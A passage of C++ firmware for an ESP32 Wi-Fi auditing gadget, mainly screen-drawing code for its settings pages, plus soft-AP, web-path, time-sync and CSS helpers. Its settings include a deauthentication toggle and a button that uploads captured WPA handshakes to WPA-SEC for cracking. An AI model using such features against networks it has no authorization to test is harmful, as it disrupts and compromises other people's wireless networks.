  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int btnW = w - content.x - 12;
  const int btnH = 36;
  const int gap  = 8;
  const int lblX = content.x + 4;
  int y = content.y + 4;

  // ── Dropbox ──────────────────────────────────────────────────────────────
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(0x07FF, TFT_BLACK);
  tft.drawString("Dropbox", lblX, y);
  y += 12;

  btnSyncDropbox = {content.x, y, btnW, btnH, "Sync all files to Dropbox"};
  drawButton(btnSyncDropbox, cfg.dropbox_token.isEmpty() ? TFT_DARKGREY : 0x0228, TFT_WHITE, TFT_WHITE);
  y += btnH + 4;

  applyFontSm();
  tft.setTextColor(strncmp(syncDropboxStatus, "OK", 2) == 0 ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
  const char* dbLine = syncDropboxStatus[0] ? syncDropboxStatus
                       : cfg.dropbox_folder.isEmpty() ? "No folder set"
                       : cfg.dropbox_folder.c_str();
  tft.drawString(String(dbLine).substring(0, 38), lblX, y);
  y += 14 + gap;

  // ── WPA-SEC ──────────────────────────────────────────────────────────────
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("WPA-SEC", lblX, y);
  y += 12;

  btnSyncWpasec = {content.x, y, btnW, btnH, "Upload captures to WPA-SEC"};
  drawButton(btnSyncWpasec, cfg.wpasec_apikey.isEmpty() ? TFT_DARKGREY : TFT_BLUE, TFT_WHITE, TFT_WHITE);
  y += btnH + 4;

  applyFontSm();
  tft.setTextColor(wpasecSyncStatus.startsWith("Uploaded") ? TFT_GREEN :
                   wpasecSyncStatus.startsWith("API") ? TFT_RED : TFT_DARKGREY, TFT_BLACK);
  String wpaLine = wpasecSyncStatus.isEmpty() ? "Scans /captures for .pcap & .22000" : wpasecSyncStatus;
  tft.drawString(wpaLine.substring(0, 38), lblX, y);
  y += 14 + gap;

  // ── Wigle ────────────────────────────────────────────────────────────────
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("Wigle.net", lblX, y);
  y += 12;

  btnSyncWigle = {content.x, y, btnW, btnH, "Upload wardrive to Wigle"};
  drawButton(btnSyncWigle, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  y += btnH + 4;

  applyFontSm();
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.drawString("Use web UI: /wigle", lblX, y);

  drawBorder();
}

static void drawStartupConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Startup");
  drawUniversalBackground();

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int row1Y = compact ? (content.y + 4)  : (content.y + 16);
  const int row2Y = compact ? (content.y + 34) : (content.y + 56);
  const int row3Y = compact ? (content.y + 64) : (content.y + 96);
  const int row4Y = compact ? (content.y + 94) : (content.y + 136);
  const int btnY1 = compact ? (content.y + 2)  : (content.y + 8);
  const int btnY2 = compact ? (content.y + 32) : (content.y + 48);
  const int btnY3 = compact ? (content.y + 62) : (content.y + 88);
  const int btnY4 = compact ? (content.y + 92) : (content.y + 128);
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_CYD)
  const int row5Y = compact ? (content.y + 124) : (content.y + 176);
  const int btnY5 = compact ? (content.y + 122) : (content.y + 168);
#endif
  const int btnW = compact ? 90 : 114;
  const int btnH = compact ? 26 : 32;
  const int btnX = w - (btnW + 12);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Reconnect on boot", content.x + 4, row1Y);

  btnStartupAutoReconnect = {btnX, btnY1, btnW, btnH, cfg.startup_autoReconnectPrompt ? "ON" : "OFF"};
  drawButton(btnStartupAutoReconnect,
             cfg.startup_autoReconnectPrompt ? TFT_DARKGREEN : TFT_MAROON,
             TFT_CYAN, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Default channel lock", content.x + 4, row2Y);

  btnStartupDefaultLockToggle = {btnX, btnY2, btnW, btnH, cfg.wifi_defaultLockChannel ? "ON" : "OFF"};
  drawButton(btnStartupDefaultLockToggle,
             cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON,
             TFT_MAGENTA, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Corner cube widget", content.x + 4, row3Y);

  btnStartupHypercube = {btnX, btnY3, btnW, btnH, cfg.ui_hypercube ? "ON" : "OFF"};
  drawButton(btnStartupHypercube,
             cfg.ui_hypercube ? TFT_DARKGREEN : TFT_MAROON,
             TFT_YELLOW, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Auto-start webserver", content.x + 4, row4Y);

  btnStartupWebserver = {btnX, btnY4, btnW, btnH, cfg.startup_webserver ? "ON" : "OFF"};
  drawButton(btnStartupWebserver,
             cfg.startup_webserver ? TFT_DARKGREEN : TFT_MAROON,
             0x07FF, TFT_WHITE);  // cyan accent

#if defined(NEONDRIVE_TARGET_M5TAB5)
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Auto-rotate (IMU)", content.x + 4, row5Y);

  btnStartupAutoRotate = {btnX, btnY5, btnW, btnH, cfg.startup_autoRotate ? "ON" : "OFF"};
  drawButton(btnStartupAutoRotate,
             cfg.startup_autoRotate ? TFT_DARKGREEN : TFT_MAROON,
             0xFFE0, TFT_WHITE);
#elif defined(NEONDRIVE_TARGET_CYD)
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("UI rotation", content.x + 4, row5Y);

  btnStartupManualRotation = {btnX, btnY5, btnW, btnH, cydRotationLabel(cfg.startup_manualRotation)};
  drawButton(btnStartupManualRotation, TFT_DARKGREY, TFT_CYAN, TFT_WHITE);
#endif

  if (!compact) {
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Saved to /config.json", content.x + 4, content.y + 172);
  }

  uiLogLayout("drawStartupConfig", content, bottom);
  uiLogButtonRect("Startup.Back", btnBack);
  drawBorder();
}

static void drawTelemetryConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Telemetry");
  drawUniversalBackground();

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int label1Y = compact ? (content.y + 2) : (content.y + 24);
  const int valueY = compact ? (content.y + 14) : (content.y + 40);
  const int btnRowY = compact ? (content.y + 24) : (content.y + 60);
  const int verbLabelY = compact ? (content.y + 54) : (content.y + 114);
  const int verbBtnY = compact ? (content.y + 50) : (content.y + 104);
  const int toggleW = compact ? 90 : 114;
  const int toggleH = compact ? 26 : 34;
  const int toggleX = w - (toggleW + 12);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Monitor refresh interval", content.x + 4, label1Y);

  char v[24];
  snprintf(v, sizeof(v), "%d ms", cfg.telemetry_monitorIntervalMs);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(v, content.x + 4, valueY);

  btnTelemetryMinus = {content.x + 4, btnRowY, 56, compact ? 26 : 34, "-"};
  btnTelemetryPlus  = {content.x + 66, btnRowY, 56, compact ? 26 : 34, "+"};
  drawButton(btnTelemetryMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnTelemetryPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Verbose serial logs", content.x + 4, verbLabelY);
  btnTelemetryVerboseToggle = {toggleX, verbBtnY, toggleW, toggleH, cfg.telemetry_verboseSerial ? "ON" : "OFF"};
  drawButton(btnTelemetryVerboseToggle,
             cfg.telemetry_verboseSerial ? TFT_DARKGREEN : TFT_MAROON,
             TFT_CYAN,
             TFT_WHITE);

  uiLogLayout("drawTelemetryConfig", content, bottom);
  uiLogButtonRect("Telemetry.Back", btnBack);
  drawBorder();
}

static void drawLedControl() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("LED Control");
  drawUniversalBackground();

  const UiRect content = computeContentRect();

  const int calibrationTextY = content.y + 2;
  // Keep Back anchored exactly 10px below the calibration line (no font/UI band offsets).
  const int backButtonY = calibrationTextY + 10;
  btnBack = {content.x + 4, backButtonY, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  ledEnsureHueInitialized();
  ledUpdateRgbFromHue();
  applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Physical CYD status LED calibration", content.x + 4, calibrationTextY);
  drawLedControlDynamic();

  uiLogLayout("drawLedControl", content, computeBottomBarRect());
  uiLogButtonRect("Led.Back", btnBack);
  drawBorder();
}

static void drawWifiConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Adapter Config");
  drawUniversalBackground();

#if defined(NEONDRIVE_TARGET_CYD)
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 98, UI_BUTTON_H, "Back"};
  btnSave = {bottom.x + 104, bottom.y, 98, UI_BUTTON_H, "Save"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnSave, configDirty ? TFT_ORANGE : TFT_DARKGREY, TFT_WHITE, TFT_BLACK);

  const int panelX = 8;
  const int panelY = 34;
  const int panelH = 20;
  const int panelW = max(120, min(uiActionDockSafeLeft() - 5, w - 10) - panelX);
  tft.drawRoundRect(panelX, panelY, panelW, panelH, 5, TFT_DARKGREY);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("WiFi adapter timing + defaults", panelX + 5, panelY + 6);

  // Keep all controls below top-shift threshold so render/touch stay aligned.
  const int baseY = max(UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 6, panelY + panelH + 8);
  const int rowGap = 6;
  const int rowH = 24;
  const int r0 = baseY;
  const int r1 = r0 + rowH + rowGap;
  const int r2 = r1 + rowH + rowGap;
  const int r3 = r2 + rowH + rowGap;

  auto drawRowBox = [&](int y) -> int {
    const int right = uiRightLimitForBand(y, rowH);
    const int x = content.x;
    const int rw = max(120, right - x);
    tft.drawRoundRect(x, y, rw, rowH, 5, TFT_DARKGREY);
    return rw;
  };

  const int w0 = drawRowBox(r0);
  const int w1 = drawRowBox(r1);
  const int w2 = drawRowBox(r2);
  const int w3 = drawRowBox(r3);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  // Row 0: Hop interval
  char hopVal[24];
  snprintf(hopVal, sizeof(hopVal), "%dms", cfg.wifi_channelHopInterval);
  const int hopBtnW = 44;
  const int hopBtnH = 20;
  const int hopBtnY = r0 + ((rowH - hopBtnH) / 2);
  const int hopPlusX = content.x + w0 - hopBtnW - 4;
  const int hopMinusX = hopPlusX - hopBtnW - 4;
  btnHopMinus = {hopMinusX, hopBtnY, hopBtnW, hopBtnH, "-"};
  btnHopPlus  = {hopPlusX, hopBtnY, hopBtnW, hopBtnH, "+"};
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.drawString("Hop interval", content.x + 6, r0 + 7);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextDatum(TR_DATUM);
  applyFontSm();
  tft.drawString(hopVal, hopMinusX - 6, r0 + 7);
  tft.setTextDatum(TL_DATUM);
  drawButton(btnHopMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnHopPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  // Row 1: Scan duration
  char scanVal[24];
  snprintf(scanVal, sizeof(scanVal), "%dms", cfg.wifi_scanDuration);
  const int scanBtnW = 44;
  const int scanBtnH = 20;
  const int scanBtnY = r1 + ((rowH - scanBtnH) / 2);
  const int scanPlusX = content.x + w1 - scanBtnW - 4;
  const int scanMinusX = scanPlusX - scanBtnW - 4;
  btnScanMinus = {scanMinusX, scanBtnY, scanBtnW, scanBtnH, "-"};
  btnScanPlus  = {scanPlusX, scanBtnY, scanBtnW, scanBtnH, "+"};
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Scan duration", content.x + 6, r1 + 7);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextDatum(TR_DATUM);
  applyFontSm();
  tft.drawString(scanVal, scanMinusX - 6, r1 + 7);
  tft.setTextDatum(TL_DATUM);
  drawButton(btnScanMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnScanPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  // Row 2: Deauth toggle
  const int tglW = 106;
  const int tglH = 20;
  const int tglY2 = r2 + ((rowH - tglH) / 2);
  const int tglX2 = content.x + w2 - tglW - 4;
  btnDeauthToggle = {tglX2, tglY2, tglW, tglH, cfg.wifi_enableDeauth ? "ON" : "OFF"};
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Enable deauth", content.x + 6, r2 + 7);
  drawButton(btnDeauthToggle, cfg.wifi_enableDeauth ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);

  // Row 3: Default lock toggle
  const int tglY3 = r3 + ((rowH - tglH) / 2);
  const int tglX3 = content.x + w3 - tglW - 4;
  btnWifiDefaultLockToggle = {tglX3, tglY3, tglW, tglH, cfg.wifi_defaultLockChannel ? "ON" : "OFF"};
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Default lock", content.x + 6, r3 + 7);
  drawButton(btnWifiDefaultLockToggle,
             cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON,
             TFT_WHITE,
             TFT_WHITE);

  // Saved SSID status line above bottom bar.
  const int ssidY = bottom.y - 14;
  tft.fillRect(content.x, ssidY - 2, w - (content.x * 2), 12, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String ssidLine = "Saved network: " + (cfg.wifi_ssid.isEmpty() ? String("(not set)") : cfg.wifi_ssid);
  while (ssidLine.length() > 4 && tft.textWidth(ssidLine) > (w - (content.x * 2) - 2)) {
    ssidLine.remove(ssidLine.length() - 1);
  }
  tft.drawString(ssidLine, content.x + 1, ssidY);

  uiLogLayout("drawWifiConfig(CYD)", content, bottom);
  uiLogButtonRect("WifiCfg.Back", btnBack);
  uiLogButtonRect("WifiCfg.Save", btnSave);
  drawBorder();
  return;
#else
  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int h = tft.height();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  btnSave = {bottom.x + 98, bottom.y, 92, UI_BUTTON_H, "Save"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnSave, configDirty ? TFT_ORANGE : TFT_DARKGREY, TFT_WHITE, TFT_BLACK);

  int y = content.y + (compact ? 2 : 8);
  const int rowGap = compact ? 34 : 56;
  const int adjustBtnH = compact ? 24 : 30;

  char hopVal[24];
  snprintf(hopVal, sizeof(hopVal), "%d ms", cfg.wifi_channelHopInterval);
  drawConfigRow("Hop interval", y, hopVal);
  btnHopMinus = {10, y + (compact ? 14 : 18), 52, adjustBtnH, "-"};
  btnHopPlus  = {70, y + (compact ? 14 : 18), 52, adjustBtnH, "+"};
  drawButton(btnHopMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnHopPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  y += rowGap;

  char scanVal[24];
  snprintf(scanVal, sizeof(scanVal), "%d ms", cfg.wifi_scanDuration);
  drawConfigRow("Scan duration", y, scanVal);
  btnScanMinus = {10, y + (compact ? 14 : 18), 52, adjustBtnH, "-"};
  btnScanPlus  = {70, y + (compact ? 14 : 18), 52, adjustBtnH, "+"};
  drawButton(btnScanMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnScanPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  y += rowGap;

  if (compact) {
    btnDeauthToggle = {10, y + 6, 96, 24, cfg.wifi_enableDeauth ? "Deauth ON" : "Deauth OFF"};
    btnWifiDefaultLockToggle = {112, y + 6, 96, 24, cfg.wifi_defaultLockChannel ? "Lock ON" : "Lock OFF"};
    drawButton(btnDeauthToggle, cfg.wifi_enableDeauth ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);
    drawButton(btnWifiDefaultLockToggle, cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);
  } else {
    drawConfigRow("WiFi: enable deauth", y, cfg.wifi_enableDeauth ? "ON" : "OFF");
    btnDeauthToggle = {10, y + 18, 110, 30, cfg.wifi_enableDeauth ? "ON" : "OFF"};
    drawButton(btnDeauthToggle, cfg.wifi_enableDeauth ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);
    y += rowGap;

    drawConfigRow("WiFi: default lock", y, cfg.wifi_defaultLockChannel ? "ON" : "OFF");
    btnWifiDefaultLockToggle = {10, y + 18, 110, 30, cfg.wifi_defaultLockChannel ? "ON" : "OFF"};
    drawButton(btnWifiDefaultLockToggle, cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);

    y += rowGap;
    const char* savedSsid = cfg.wifi_ssid.isEmpty() ? "(not set)" : cfg.wifi_ssid.c_str();
    drawConfigRow("WiFi: saved network", y, savedSsid);
  }

  if (compact) {
    tft.setTextDatum(BL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("BTN1=Next  BTN2=Select", 6, h - 6);
  } else {
    tft.setTextDatum(BL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Config stored in /config.json (LittleFS). Run: pio run -t uploadfs", 6, h - 6);
  }

  uiLogLayout("drawWifiConfig", content, bottom);
  uiLogButtonRect("WifiCfg.Back", btnBack);
  uiLogButtonRect("WifiCfg.Save", btnSave);
  drawBorder();
#endif
}

// Forward declarations for web routes
static void syncWithWPASec();
static void downloadWPASecResults();

// ---------- WiFi Connect Screen ----------
static void connectToWifi(const String& ssid, const String& password) {
  wifiConnectStart(
    ssid,
    password,
    wifiConnectStatus,
    wifiConnectInProgress,
    wifiConnectAttemptMs,
    wifiConnectSsid,
    wifiConnectPassword,
    pushConsoleEventf
  );
}

static void startAPMode() {
  if (apMode) {
    // Stop AP
    apMode = false;
    Serial.println("[wifi] Stopping AP mode");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    wifiConnectStatus = "AP stopped";
    Serial.println("[wifi] AP stopped");
    pushConsoleEvent("INFO", "AP", "AP stopped");
    return;
  }

  apMode = true;
  Serial.printf("[wifi] Starting AP mode: SSID='%s', auth=%s\n", 
                apSsid.c_str(), 
                apPassword.isEmpty() ? "OPEN" : "WPA2");

  // Stop any existing connections
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[wifi] Disconnecting from existing STA connection");
    WiFi.disconnect();
    delay(100);
  }

  // Start AP mode
  WiFi.mode(WIFI_AP);
  delay(100);

  bool apStarted;
  if (apPassword.isEmpty()) {
    Serial.printf("[wifi] Starting AP with no password, channel 1, 4 max clients\n");
    apStarted = WiFi.softAP(apSsid.c_str(), NULL, 1, false, 4);
  } else {
    Serial.printf("[wifi] Starting AP with password, channel 1, 4 max clients\n");
    apStarted = WiFi.softAP(apSsid.c_str(), apPassword.c_str(), 1, false, 4);
  }

  delay(500);
  
  if (apStarted) {
    wifiConnectStatus = "AP Active: " + apSsid;
    Serial.printf("[wifi] AP started successfully. IP: %s\n", WiFi.softAPIP().toString().c_str());
    pushConsoleEventf("INFO", "AP", "AP started ssid='%s' ip=%s", apSsid.c_str(), WiFi.softAPIP().toString().c_str());
  } else {
    apMode = false;
    wifiConnectStatus = "AP failed to start";
    Serial.println("[wifi] ERROR: AP startup failed");
    pushConsoleEvent("ERROR", "AP", "AP failed to start");
  }
}

// Forward declaration — defined later alongside macFromString()
static int hexDecodePayload(const char* hex, uint8_t* out, int maxLen);

static bool confirmWebRiskAction(RiskyWebAction action, const char* actionLabel) {
  if (!webServerRunning) return true;

  uint32_t now = millis();
  const uint32_t confirmWindowMs = 5000;
  if (pendingRiskyWebAction == action && (now - pendingRiskyWebActionMs) <= confirmWindowMs) {
    pendingRiskyWebAction = RiskyWebAction::NONE;
    pendingRiskyWebActionMs = 0;
    return true;
  }

  pendingRiskyWebAction = action;
  pendingRiskyWebActionMs = now;

  char msg[168];
  snprintf(msg, sizeof(msg),
           "WARN: %s may disrupt WebServer/AP access. Tap same button again within 5s to confirm.",
           actionLabel ? actionLabel : "This action");
  wifiConnectStatus = msg;
  pushConsoleEvent("WARN", "WEB", msg);
  Serial.println(msg);
  return false;
}

static String escapeHtml(const String& in) {
  String out;
  out.reserve(in.length() + 16);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    if (c == '&') out += "&amp;";
    else if (c == '<') out += "&lt;";
    else if (c == '>') out += "&gt;";
    else if (c == '"') out += "&quot;";
    else out += c;
  }
  return out;
}

static String urlEncodeSimple(const String& in) {
  static const char* hex = "0123456789ABCDEF";
  String out;
  out.reserve(in.length() * 3);
  for (size_t i = 0; i < in.length(); i++) {
    uint8_t c = (uint8_t)in[i];
    bool safe = (c >= 'a' && c <= 'z') ||
                (c >= 'A' && c <= 'Z') ||
                (c >= '0' && c <= '9') ||
                c == '-' || c == '_' || c == '.' || c == '~' || c == '/';
    if (safe) out += (char)c;
    else {
      out += '%';
      out += hex[(c >> 4) & 0x0F];
      out += hex[c & 0x0F];
    }
  }
  return out;
}

static String normalizeSdWebPath(String path) {
  path.trim();
  path.replace('\\', '/');
  while (path.indexOf("//") >= 0) path.replace("//", "/");
  if (path.isEmpty()) path = "/";
  if (!path.startsWith("/")) path = "/" + path;
  if (path.indexOf("..") >= 0) return "";
  if (path.length() > 1 && path.endsWith("/")) path.remove(path.length() - 1);
  return path;
}

static String pathParent(const String& path) {
  if (path == "/") return "/";
  int cut = path.lastIndexOf('/');
  if (cut <= 0) return "/";
  return path.substring(0, cut);
}

static bool removeSdPathRecursive(const String& path) {
  if (path.isEmpty() || path == "/" || !SD.exists(path)) return false;
  File f = SD.open(path, FILE_READ);
  if (!f) return false;
  if (!f.isDirectory()) {
    f.close();
    return SD.remove(path);
  }

  while (true) {
    File child = f.openNextFile();
    if (!child) break;
    String childPath = child.name();
    if (!childPath.startsWith("/")) {
      childPath = path;
      if (!childPath.endsWith("/")) childPath += "/";
      childPath += child.name();
    }
    bool isDir = child.isDirectory();
    child.close();
    if (isDir) {
      if (!removeSdPathRecursive(childPath)) {
        f.close();
        return false;
      }
    } else {
      if (!SD.remove(childPath)) {
        f.close();
        return false;
      }
    }
  }
  f.close();
  return SD.rmdir(path);
}

// ---------- Time sync/persist (for SD FAT timestamps) ----------
static constexpr time_t MIN_VALID_EPOCH = 1704067200;  // 2024-01-01 UTC
static constexpr const char* LAST_EPOCH_PATH = "/last_epoch.txt";
static bool ntpRequested = false;
static uint32_t lastNtpAttemptMs = 0;
static uint32_t lastClockTickMs = 0;
static uint32_t lastEpochPersistMs = 0;
static time_t lastPersistedEpoch = 0;

static bool isSystemTimeValid() {
  return time(nullptr) >= MIN_VALID_EPOCH;
}

static void restoreEpochFromLittleFs() {
  if (!LittleFS.exists(LAST_EPOCH_PATH)) return;
  File f = LittleFS.open(LAST_EPOCH_PATH, FILE_READ);
  if (!f) return;
  String epochStr = f.readStringUntil('\n');
  f.close();
  epochStr.trim();
  if (epochStr.isEmpty()) return;
  time_t savedEpoch = (time_t)strtoull(epochStr.c_str(), nullptr, 10);
  if (savedEpoch < MIN_VALID_EPOCH) return;
  if (savedEpoch <= time(nullptr)) return;
  struct timeval tv;
  tv.tv_sec = savedEpoch;
  tv.tv_usec = 0;
  settimeofday(&tv, nullptr);
  Serial.printf("[time] Restored epoch from LittleFS: %lu\n", (unsigned long)savedEpoch);
}

static void persistEpochToLittleFs(bool force = false) {
  time_t nowEpoch = time(nullptr);
  if (nowEpoch < MIN_VALID_EPOCH) return;
  if (!force) {
    if (millis() - lastEpochPersistMs < 60000) return;
    if (lastPersistedEpoch != 0 && (nowEpoch - lastPersistedEpoch) < 60) return;
  }
  File f = LittleFS.open(LAST_EPOCH_PATH, FILE_WRITE);
  if (!f) return;
  f.printf("%lu\n", (unsigned long)nowEpoch);
  f.close();
  lastPersistedEpoch = nowEpoch;
  lastEpochPersistMs = millis();
}

static void requestNtpTimeIfNeeded() {
  if (WiFi.status() != WL_CONNECTED) return;
  if (millis() - lastNtpAttemptMs < 30000) return;
  lastNtpAttemptMs = millis();
  configTzTime("UTC0", "pool.ntp.org", "time.nist.gov", "time.google.com");
  if (!ntpRequested) {
    Serial.println("[time] Requested NTP sync");
    ntpRequested = true;
  }
}

static void timeServiceTick() {
  if (millis() - lastClockTickMs < 1000) return;
  lastClockTickMs = millis();

  if (!isSystemTimeValid()) {
    requestNtpTimeIfNeeded();
    return;
  }

  static bool reportedValid = false;
  if (!reportedValid) {
    reportedValid = true;
    time_t nowEpoch = time(nullptr);
    struct tm tmNow;
    if (gmtime_r(&nowEpoch, &tmNow)) {
      Serial.printf("[time] System time valid (UTC): %04d-%02d-%02d %02d:%02d:%02d\n",
                    tmNow.tm_year + 1900, tmNow.tm_mon + 1, tmNow.tm_mday,
                    tmNow.tm_hour, tmNow.tm_min, tmNow.tm_sec);
    } else {
      Serial.println("[time] System time valid");
    }
  }

  persistEpochToLittleFs();
}

static String neonNavLink(const char* href, const char* label, const String& active) {
  String out = "<a";
  if (active == href) out += " class='active'";
  out += " href='";
  out += href;
  out += "'>";
  out += label;
  out += "</a>";
  return out;
}

static const char* neonBaseCss() {
  return R"CSS(
:root{
  --bg-0:#05070d;
  --bg-1:#0b1020;
  --panel:#0e1626;
  --panel-hi:#152138;
  --text:#f3f7ff;
  --muted:#97aac8;
  --neon-cyan:#29f5ff;
  --neon-magenta:#ff3ad9;
  --neon-lime:#9aff3a;
  --warning:#ffbf3a;
  --danger:#ff4d5f;
  --radius:14px;
  --shadow:0 16px 36px rgba(0,0,0,.45);
  --glow:0 0 20px rgba(41,245,255,.24);
  --border:1px solid rgba(41,245,255,.22);
  --grid:rgba(41,245,255,.08);
}
*{box-sizing:border-box}
html,body{margin:0;padding:0;min-height:100%}
body{
  font-family:"Segoe UI","Trebuchet MS","Arial Narrow",Arial,sans-serif;
  color:var(--text);
  background:
    radial-gradient(120% 80% at 10% -10%, rgba(255,58,217,.12), transparent 55%),
    radial-gradient(120% 80% at 90% -20%, rgba(41,245,255,.1), transparent 52%),
    linear-gradient(170deg,var(--bg-1) 0%,var(--bg-0) 52%,#04050a 100%);
}
.nd-grid,.nd-scan{position:fixed;inset:0;pointer-events:none;z-index:0}
.nd-grid{
  background-image:
    linear-gradient(var(--grid) 1px,transparent 1px),
    linear-gradient(90deg,var(--grid) 1px,transparent 1px);
  background-size:36px 36px;
  opacity:.25;
}
.nd-scan{
  background:repeating-linear-gradient(
    to bottom,
    rgba(255,255,255,.02) 0,
    rgba(255,255,255,.02) 1px,
    rgba(0,0,0,0) 2px,
    rgba(0,0,0,0) 4px
  );
  opacity:.18;
}
.nd-wrap{position:relative;z-index:1;max-width:1160px;margin:0 auto;padding:16px 14px 26px}
.nd-topbar{
  position:sticky;top:0;z-index:4;
  margin:4px 0 14px;padding:14px 14px 10px;
  background:rgba(8,13,24,.88);
  border:var(--border);
  border-radius:var(--radius);
  box-shadow:var(--shadow);
  backdrop-filter:blur(6px);
}
.nd-kicker{
  margin:0 0 3px;
  font-size:11px;
  letter-spacing:.22em;
  text-transform:uppercase;
  color:var(--neon-cyan);
}
h1{
  margin:0;
  font-size:clamp(1.1rem,2vw,1.45rem);
  letter-spacing:.08em;
  text-transform:uppercase;
}
.nd-subtitle{margin:8px 0 0;color:var(--muted)}
.nd-nav-toggle{
  display:none;
  margin-top:10px;
  border:1px solid rgba(41,245,255,.5);
  background:rgba(41,245,255,.12);
  color:var(--text);
  border-radius:999px;
  padding:7px 12px;
}
.nd-nav{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
.nd-nav a{
  color:var(--muted);
  text-decoration:none;
  padding:6px 10px;
  border:1px solid rgba(41,245,255,.22);
